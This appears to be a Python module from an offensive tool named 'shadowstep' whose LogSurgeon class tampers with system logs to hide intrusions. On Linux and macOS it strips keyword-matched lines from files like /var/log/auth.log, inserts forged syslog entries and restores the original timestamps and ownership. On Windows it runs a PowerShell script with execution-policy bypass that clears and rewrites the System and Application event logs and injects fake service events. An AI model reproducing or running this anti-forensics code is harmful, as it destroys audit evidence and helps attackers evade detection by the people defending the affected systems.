import os
import random
import platform
import subprocess
import sys
import shutil
from shadowstep.utils.logger import log

# Conditional imports for Windows libraries
# We use try/except to prevent crashes on Linux/macOS
# We use # type: ignore to silence IDE warnings on non-Windows dev environments
if platform.system() == "Windows":
    try:
        import win32evtlog # type: ignore
        import win32api    # type: ignore
        import win32con    # type: ignore
        import win32security # type: ignore
    except ImportError:
        pass # If pywin32 is missing, we handle it in the class init

class LogSurgeon:
    """
    Performs surgical operations on log files (Cross-Platform).
    - Linux/macOS: Manipulates text-based log files (e.g., /var/log/auth.log) while preserving metadata.
    - Windows: Uses PowerShell and Win32 API to filter Event Logs (.evtx) and inject decoys.
    """

    def __init__(self):
        self.os_type = platform.system()
        
        # Realistic decoy log templates for Linux systems
        self.linux_decoy_logs = [
            "CRON[{}]: (root) CMD (run-parts /etc/cron.hourly)",
            "systemd[1]: Starting Cleanup of Temporary Directories...",
            "systemd[1]: Started Cleanup of Temporary Directories.",
            "kernel: [UFW BLOCK] IN=eth0 OUT= MAC=00:00:00:00:00:00 SRC=192.168.1.105 DST=192.168.1.255 PROTO=UDP SPT=137 DPT=137 LEN=78",
            "sshd[{}]: Connection closed by 127.0.0.1 port {} [preauth]",
            "systemd-resolved[{}]: Server returned error NXDOMAIN, mitigating potential DNS violation so still holding on to..."
        ]

    def sanitize(self, target, keywords, inject_fake=True):
        """
        Main router function. Dispatches the cleaning task based on the OS.
        """
        if self.os_type == "Windows":
            return self._sanitize_windows(keywords, inject_fake)
        else:
            return self._sanitize_linux(target, keywords, inject_fake)

    # ==========================
    # LINUX / MACOS LOGIC
    # ==========================
    def _sanitize_linux(self, file_path, keywords_to_remove, inject_fake):
        """Surgical cleaning for text-based logs on Linux/macOS."""
        if not file_path or not os.path.exists(file_path):
            log.error(f"Log file not found: {file_path}")
            return False

        try:
            # 1. Preserve Metadata (Crucial for Anti-Forensics)
            # We must restore these attributes later so the file doesn't look 'touched'.
            stats = os.stat(file_path)
            original_perms = stats.st_mode
            original_uid = stats.st_uid
            original_gid = stats.st_gid
            original_atime = stats.st_atime
            original_mtime = stats.st_mtime

            # 2. Read content safely
            with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
                lines = f.readlines()

            new_lines = []
            removed_count = 0
            
            # 3. Filter and Inject
            for line in lines:
                if any(keyword in line for keyword in keywords_to_remove):
                    removed_count += 1
                    if inject_fake:
                        # Generate a realistic looking decoy
                        fake_msg = random.choice(self.linux_decoy_logs)
                        fake_msg = fake_msg.format(random.randint(1000, 9999), random.randint(30000, 60000))
                        
                        # Attempt to preserve the timestamp style of the original log
                        # Standard syslog format usually has date in first 15 chars
                        timestamp_part = line[:15]
                        hostname = platform.node() 
                        
                        # Construct the new line
                        new_lines.append(f"{timestamp_part} {hostname} {fake_msg}\n")
                        log.debug(f"Decoy injected: {fake_msg[:40]}...")
                else:
                    new_lines.append(line)

            # 4. Write changes only if necessary
            if removed_count > 0:
                with open(file_path, 'w', encoding='utf-8') as f:
                    f.writelines(new_lines)
                
                # 5. Restore Metadata (Timestomp logic built-in)
                try:
                    os.chown(file_path, original_uid, original_gid)
                    os.chmod(file_path, original_perms)
                    os.utime(file_path, (original_atime, original_mtime))
                except Exception as meta_error:
                    log.warning(f"Could not fully restore metadata (requires root): {meta_error}")

                log.info(f"Surgical cleaning complete on {file_path}: {removed_count} entries removed/masked.")
                return True
            else:
                log.info(f"No matching keywords found in {file_path}. File untouched.")
                return False

        except PermissionError:
            log.error(f"Access denied: {file_path} (Root privileges required).")
            return False
        except Exception as e:
            log.error(f"Linux surgical error: {e}")
            return False

    # ==========================
    # WINDOWS LOGIC
    # ==========================
    def _sanitize_windows(self, keywords, inject_fake):
        """Windows Event Log cleaning using PowerShell and Win32 API."""
        if 'win32evtlog' not in sys.modules:
            log.error("The 'pywin32' module is missing. Install via: pip install pywin32")
            return False

        # 1. Inject Decoys (Noise Generation)
        if inject_fake:
            log.info("Injecting decoy events to mask activity...")
            self._inject_windows_decoy()

        # 2. Surgical Cleaning (PowerShell)
        log.warning("Starting Windows surgical cleaning via PowerShell...")
        
        # Format keywords for PowerShell array
        keywords_str = ', '.join([f'"{k}"' for k in keywords])
        
        # Advanced PowerShell Script
        # This script filters memory streams rather than writing to disk to minimize I/O artifacts.
        ps_script = f"""
        $ErrorActionPreference = "SilentlyContinue"
        $Keywords = @({keywords_str})
        $TargetLogs = "System", "Application"
        
        ForEach ($LogName in $TargetLogs) {{
            Write-Host "[*] Analyzing $LogName..."
            
            # Fetch logs and filter in memory
            $CleanEvents = Get-EventLog -LogName $LogName | Where-Object {{ 
                $msg = $_.Message
                $src = $_.Source
                $keep = $true
                foreach ($k in $Keywords) {{
                    if ($msg -match $k -or $src -match $k) {{ $keep = $false }}
                }}
                $keep
            }}
            
            # If we found dirty logs (count mismatch), perform the wipe and rewrite
            $CurrentCount = (Get-EventLog -LogName $LogName).Count
            if ($CleanEvents.Count -lt $CurrentCount) {{
                Clear-EventLog -LogName $LogName
                
                # Re-inject the clean events
                # Note: TimeCreated cannot be perfectly forged via Write-EventLog without kernel drivers,
                # but EntryType and Message are preserved.
                ForEach ($Event in $CleanEvents) {{
                     $Type = "Information"
                     if ($Event.EntryType -eq "Error") {{ $Type = "Error" }}
                     elseif ($Event.EntryType -eq "Warning") {{ $Type = "Warning" }}
                     
                     Write-EventLog -LogName $LogName -Source $Event.Source -EventId $Event.InstanceId -EntryType $Type -Message $Event.Message -Category $Event.CategoryNumber
                }}
                Write-Host "[+] $LogName sanitized successfully."
            }} else {{
                Write-Host "[-] No traces found in $LogName."
            }}
        }}
        """
        
        try:
            # Execute PowerShell with encoded command or direct execution
            cmd = ["powershell", "-NoProfile", "-ExecutionPolicy", "Bypass", "-Command", ps_script]
            result = subprocess.run(cmd, capture_output=True, text=True)
            
            if result.returncode == 0:
                log.info("Windows event log sanitization completed.")
                # Optional: log debug output if needed
                # log.debug(result.stdout)
                return True
            else:
                log.error(f"PowerShell execution failed: {result.stderr}")
                return False
        except Exception as e:
            log.error(f"Windows surgical error: {e}")
            return False

    def _inject_windows_decoy(self):
        """Injects legitimate-looking events using the Win32 API."""
        try:
            ph = win32api.GetCurrentProcess()
            th = win32security.OpenProcessToken(ph, win32con.TOKEN_READ)
            my_sid = win32security.GetTokenInformation(th, win32security.TokenUser)[0]
            
            source = "Service Control Manager"
            # Attempt to register source. If it fails (exists), we proceed.
            try:
                handle = win32evtlog.RegisterEventSource(None, source)
            except:
                handle = win32evtlog.OpenEventLog(None, source)

            # Realistic Decoy Messages
            decoys = [
                (7036, "The Background Intelligent Transfer Service service entered the running state."),
                (7036, "The Windows Update service entered the running state."),
                (1074, "The process C:\\Windows\\System32\\svchost.exe has initiated the power off of computer on behalf of user NT AUTHORITY\\SYSTEM.")
            ]
            
            for eid, msg in decoys:
                win32evtlog.ReportEvent(
                    handle, 
                    win32evtlog.EVENTLOG_INFORMATION_TYPE, 
                    0,
                    eid, 
                    my_sid, 
                    [msg], 
                    None
                )
                log.debug(f"Decoy event injected: ID {eid}")
                
            win32evtlog.DeregisterEventSource(handle)
        except Exception as e:
            log.warning(f"Decoy injection failed (Admin rights required?): {e}")